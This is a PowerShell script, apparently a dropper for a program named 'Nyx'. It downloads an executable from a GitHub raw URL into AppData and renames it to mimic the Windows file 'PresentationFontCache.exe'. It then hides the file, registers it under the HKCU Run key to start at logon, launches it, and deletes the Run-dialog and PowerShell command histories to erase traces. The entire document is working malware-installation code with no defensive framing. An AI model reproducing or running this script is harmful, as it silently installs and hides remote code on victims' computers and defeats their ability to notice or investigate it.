# Nyx - PZ5X5R2P

# Create folder for Nyx
New-Item -Path "$env:APPDATA" -Name "PZ5X5R2P" -ItemType Directory

# Download Nyx
Invoke-WebRequest https://raw.githubusercontent.com/VVolfCZ/ProjectNyx/main/PZ5X5R2P/PZ5X5R2P.exe -OutFile "$env:APPDATA\PZ5X5R2P\PZ5X5R2P.exe"

# Change Nyx name
Rename-Item -Path "$env:APPDATA\PZ5X5R2P\PZ5X5R2P.exe" -NewName "PresentationFontCache.exe"

# Hide Nyx
$FILE=Get-Item "$env:APPDATA\PZ5X5R2P\PresentationFontCache.exe" -Force
$FILE.attributes='Hidden'

# Add Nyx to startup processes
New-ItemProperty -Path "HKCU:\Software\Microsoft\Windows\CurrentVersion\Run" `
-Name "PZ5X5R2P" `
-Value "$env:APPDATA\PZ5X5R2P\PresentationFontCache.exe"

# Run Nyx
& "$env:APPDATA\PZ5X5R2P\PresentationFontCache.exe"

# Delete run box history
reg delete HKEY_CURRENT_USER\Software\Microsoft\Windows\CurrentVersion\Explorer\RunMRU /va /f 

# Delete powershell history
Remove-Item (Get-PSreadlineOption).HistorySavePath -ErrorAction SilentlyContinue
